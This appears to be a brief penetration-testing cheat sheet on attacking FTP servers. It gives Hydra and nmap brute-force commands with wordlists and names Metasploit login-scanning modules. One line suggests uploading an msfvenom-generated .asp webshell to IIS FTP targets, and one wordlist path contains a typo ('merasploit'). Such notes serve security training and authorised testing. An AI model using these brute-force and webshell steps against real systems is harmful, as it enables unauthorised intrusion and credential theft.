# Hydra

- hydra -L user_list -P pass_list 192.235.127.3 -t 4 ftp
- hydra -L /usr/share/merasploit-framework/data/wordlists/common_users.txt -P /usr/share/merasploit-framework/data/wordlists/unix_passwords.txt 10.10.10.10 ftp
# Nmap

- nmap --script ftp-brute --script-args userdb=/root/users -p 21
## Nmap scrips

- ftp-anon : check if anon login allowed
- ftp-brute --script-args userdb=/root/users :
# Connect to ftp server

```
ftp <ip>
```
# Metasploit Modules

- auxiliary/scanner/ftp/ftp_login : brute force ftp
- auxiliary/scanner/ftp/anonymous : anonymous login test
- If targeting Microsoft IIS FTP, generate and upload .asp webshell using msfvenom.
# References

1. [proftpd](http://www.proftpd.org/)
2. [THC Hydra](https://tools.kali.org/password-attacks/hydra)
3. [ftp](https://linux.die.net/man/1/ftp)
4. [Nmap Script: ftp-brute](https://nmap.org/nsedoc/scripts/ftp-brute.html)
5. [vsftpd](https://security.appspot.com/vsftpd.html)